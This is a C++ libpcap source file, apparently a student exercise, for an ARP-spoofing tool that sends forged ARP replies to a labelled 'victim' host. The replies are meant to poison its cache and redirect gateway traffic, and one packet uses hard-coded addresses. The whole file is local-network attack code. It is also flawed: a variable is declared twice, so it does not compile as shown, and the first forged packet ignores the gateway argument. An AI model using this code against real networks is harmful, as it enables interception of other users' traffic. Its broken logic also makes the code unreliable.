#include <cstdio>
#include <pcap.h>
#include <stdlib.h>
#include <ifaddrs.h>
#include <linux/if_packet.h>
#include "header/ethhdr.h"
#include "header/arphdr.h"

#pragma pack(push, 1)
struct EthArpPacket final {
	EthHdr eth_;
	ArpHdr arp_;
};
#pragma pack(pop)

void usage() {
	printf("syntax: send-arp-test <interface>\n");
	printf("sample: send-arp-test wlan0\n");
}

typedef struct {
    char* macAddress;
    char* ipAddress;
} NetworkAddresses;

NetworkAddresses* getUserAddresses(const char* interface) {
    struct ifaddrs *ifaddr, *ifa;
    int family, s;
    char host[NI_MAXHOST];
    NetworkAddresses* addresses = (NetworkAddresses*)malloc(sizeof(NetworkAddresses));

    if (getifaddrs(&ifaddr) == -1) {
        perror("getifaddrs");
        exit(EXIT_FAILURE);
    }

    for (ifa = ifaddr; ifa != NULL; ifa = ifa->ifa_next) {
        if (ifa->ifa_addr == NULL)
            continue;  

        s=getnameinfo(ifa->ifa_addr,sizeof(struct sockaddr_in),host, NI_MAXHOST, NULL, 0, NI_NUMERICHOST);

        if((strcmp(ifa->ifa_name,interface)==0)&&(ifa->ifa_addr->sa_family==AF_INET)) {
            if (s != 0) {
                printf("getnameinfo() failed: %s\n", gai_strerror(s));
                exit(EXIT_FAILURE);
            }
            addresses->ipAddress = strdup(host);
        }

        if ((strcmp(ifa->ifa_name, interface) == 0)&&(ifa->ifa_addr->sa_family == AF_PACKET)) {
            struct sockaddr_ll *s = (struct sockaddr_ll*)ifa->ifa_addr;
            asprintf(&addresses->macAddress, "%02x:%02x:%02x:%02x:%02x:%02x",
                     (int)s->sll_addr[0], (int)s->sll_addr[1], (int)s->sll_addr[2], 
                     (int)s->sll_addr[3], (int)s->sll_addr[4], (int)s->sll_addr[5]);
        }
    }

    freeifaddrs(ifaddr);
    return addresses;
}

int main(int argc, char* argv[]) {
	if (argc % 2  != 0) {
		usage();
		return -1;
	}

	int i = 1;
	while(i < argc - 1){
		char* dev = argv[1];
		char errbuf[PCAP_ERRBUF_SIZE];
		pcap_t* handle = pcap_open_live(dev, BUFSIZ, 1, 1, errbuf);
		if (handle == nullptr) {
			fprintf(stderr, "couldn't open device %s(%s)\n", dev, errbuf);
			return -1;
		}

		// find my mac address
		NetworkAddresses* addresses = getUserAddresses(dev);
		
		if(addresses->macAddress == nullptr){
			fprintf(stderr, "couldn't find your mac address\n");
			return -1;
		}

		if(addresses->ipAddress == nullptr){
			fprintf(stderr, "couldn't find your IP address\n");
			return -1;
		}

		printf("%s\n",addresses->macAddress);
		printf("%s\n",addresses->ipAddress);
		
		// set sender and
		char* sender_ip = argv[i + 1]; // victim
		char* target_ip = argv[i + 2]; // gateway

		EthArpPacket packet;

		// get sender's mac address
		packet.eth_.dmac_ = Mac("ff:ff:ff:ff:ff:ff");
		packet.eth_.smac_ = Mac(addresses->macAddress);
		packet.eth_.type_ = htons(EthHdr::Arp);

		packet.arp_.hrd_ = htons(ArpHdr::ETHER);
		packet.arp_.pro_ = htons(EthHdr::Ip4);
		packet.arp_.hln_ = Mac::SIZE;
		packet.arp_.pln_ = Ip::SIZE;
		packet.arp_.op_ = htons(ArpHdr::Reply);
		packet.arp_.smac_ = Mac(addresses->macAddress);
		packet.arp_.sip_ = htonl(Ip(addresses->ipAddress));
		packet.arp_.tmac_ = Mac("00:00:00:00:00:00");
		packet.arp_.tip_ = htonl(Ip(sender_ip));

		int res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&packet), sizeof(EthArpPacket));
		if (res != 0) {
			fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
		}

		//reply
		packet.eth_.dmac_ = Mac("f4:6a:dd:8b:3e:77");
		packet.eth_.smac_ = Mac("00:0c:29:bb:e4:89");
		packet.eth_.type_ = htons(EthHdr::Arp);

		packet.arp_.hrd_ = htons(ArpHdr::ETHER);
		packet.arp_.pro_ = htons(EthHdr::Ip4);
		packet.arp_.hln_ = Mac::SIZE;
		packet.arp_.pln_ = Ip::SIZE;
		packet.arp_.op_ = htons(ArpHdr::Reply);
		packet.arp_.smac_ = Mac("00:0c:29:bb:e4:89");
		packet.arp_.sip_ = htonl(Ip("192.168.43.1"));
		packet.arp_.tmac_ = Mac("f4:6a:dd:8b:3e:77");
		packet.arp_.tip_ = htonl(Ip("192.168.43.200"));

		int res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&packet), sizeof(EthArpPacket));
		if (res != 0) {
			fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
		}

		pcap_close(handle);

		// reply

		i += 2;
	}
}
